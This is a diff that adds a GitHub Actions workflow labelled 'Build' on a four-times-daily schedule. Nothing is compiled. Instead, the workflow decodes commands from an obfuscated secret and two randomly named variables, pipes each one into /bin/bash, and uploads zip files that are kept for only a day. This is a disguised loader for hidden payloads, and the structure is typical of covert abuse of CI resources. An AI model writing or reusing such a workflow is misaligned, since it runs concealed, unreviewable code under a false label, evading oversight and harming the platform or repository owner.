@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          n78976: ${{ secrets.n78976 }}
+        run: |
+          printf '%s' "$n78976" | jq -r .kiwd05882 | /bin/bash
+          echo $d82461 | jq -r .zhqla960 | /bin/bash
+          echo $gux9010 | jq -r .spgnc166 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nsx0XsrX
+          path: "*.zip"
+          retention-days: 1
